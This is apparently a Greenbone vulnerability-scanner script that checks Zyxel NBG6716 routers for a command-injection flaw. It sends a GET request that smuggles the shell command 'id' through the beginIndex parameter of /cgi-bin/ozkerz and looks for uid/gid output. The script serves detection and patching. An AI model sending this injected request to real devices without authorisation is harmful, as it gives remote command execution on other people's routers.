if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.140497" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2017-11-10 13:05:48 +0700 (Fri, 10 Nov 2017)" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_tag( name: "qod_type", value: "exploit" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_name( "Zyxel NBG6716 RCE Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2017 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "summary", value: "Zyxel NBG6716 devices allow command injection in the ozkerz component
  because beginIndex and endIndex are used directly in a popen call." );
	script_tag( name: "vuldetect", value: "Sends a crafted request via HTTP GET and checks whether
  it is possible to execute a remote command." );
	script_tag( name: "solution", value: "Upgrade to firmware version V1.00(AAKG.11)C0 or later." );
	script_xref( name: "URL", value: "https://www.secarma.co.uk/labs/sohopelessly-broken-0-day-strategy/" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
res = http_get_cache( port: port, item: "/cgi-bin/luci" );
if(ContainsString( res, "title>NBG6716 - Login</title>" ) && ContainsString( res, "Model:NBG6716" )){
	url = "/cgi-bin/ozkerz?eventFlows=1&beginIndex=|id&endIndex=";
	if(http_vuln_check( port: port, url: url, pattern: "uid=[0-9]+.*gid=[0-9]+", check_header: TRUE )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
	exit( 99 );
}
exit( 0 );

